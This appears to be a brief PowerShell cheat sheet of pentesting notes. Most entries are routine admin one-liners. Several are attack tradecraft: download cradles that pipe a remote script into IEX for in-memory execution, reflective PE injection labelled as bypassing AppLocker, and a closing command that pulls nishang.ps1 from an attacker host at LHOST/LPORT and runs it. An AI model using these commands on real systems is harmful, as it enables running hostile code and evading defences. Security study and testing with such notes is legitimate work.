# Extract zip file
`Expand-Archive <FILE>.zip`

# Download to disk
## using .Net WebClient:
`(New-Object System.Net.WebClient).DownloadFile('<URL>', <OUTPUTPATH>)`

## using Invoke-WebRequest
`IWR '<URL>' -OutFile <FILENAME>`

# Execute powershell in memory
`(New-Object Net.WebClient).DownloadString('<URL>') | IEX`

# Get files only in a directory
`(ls -File -Recurse -Force -EA SilentlyContinue).fullname`

# Get OS architecture
`$env:processor_architecture`

# Get Process Architecture
`[Environment]::Is64BitProcess`

# Get ACL
`Get-ACL <PATH_TO_FILE> | Select -Exp AccessToString`

# Get Process Owners
`Get-WmiObject -class win32_process | select name,@{n='owner';e={$_.getowner().user}}`

# Get .NET Version
## Paths:
`c:\windows\microsoft.net\framework`
`c:\windows\microsoft.net\framework64`
## Command:
`(Get-Item "c:\windows\microsoft.net\framework64\*\clr.dll").VersionInfo.ProductVersion`

# Reflective Execution (Can Bypass Applocker)
`Invoke-reflectivePEInjection -PEBytes ([IO.File]::ReadAllBytes('<PATH_TO_EXE>'))`


# CMD to powershell
`powershell "IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/nishang.ps1')"`